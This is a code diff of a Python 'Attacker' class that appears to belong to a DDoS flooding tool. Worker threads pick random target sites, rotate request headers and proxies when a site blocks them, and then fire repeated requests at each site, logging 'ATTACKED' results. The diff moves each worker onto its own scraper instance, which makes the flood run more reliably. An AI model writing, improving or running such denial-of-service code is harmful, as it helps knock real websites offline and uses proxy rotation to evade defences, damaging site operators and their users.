@@ -18,14 +18,13 @@ class Attacker:
     stop_event: Optional[Event] = None
 
     def __init__(self):
-        self.scraper: Scraper = Scraper()
         self.sites_for_attack: Optional[list[str]] = None
         self.__workers: Optional[list[Thread]] = None
 
-    def site_attack(self, site_url: str):
+    def site_attack(self, site_url: str, scraper: Scraper):
         self.success_response_count += 1
         for _ in range(MAX_REQUESTS):
-            response = self.scraper.send_request_to_site(site_url)
+            response = scraper.send_request_to_site(site_url)
             self.success_response_count += 1
             message = f"ATTACKED {site_url}; " \
                       f"RESPONSE CODE: {response.status_code}; " \
@@ -43,22 +42,23 @@ class Attacker:
 
     def _worker(self):
         while not self.stop_event.is_set():
-            self.scraper.update_headers()
+            scraper = Scraper()
+            scraper.update_headers()
             site = self.get_random_site()
             log.info(f"STARTING ATTACK TO {site}")
             try:
-                response = self.scraper.send_request_to_site(site)
+                response = scraper.send_request_to_site(site)
                 if response.status_code > 303:
                     while True:
                         try:
-                            self.scraper.update_proxies()
+                            scraper.update_proxies()
                         except StopIteration:
                             break
-                        response = self.scraper.send_request_to_site(site)
+                        response = scraper.send_request_to_site(site)
                         if response.status_code in range(200, 302):
-                            self.site_attack(site)
+                            self.site_attack(site, scraper)
                 else:
-                    self.site_attack(site)
+                    self.site_attack(site, scraper)
             except Exception as ex:
                 log.error(f"{site}: {ex}")
             sleep(.005)
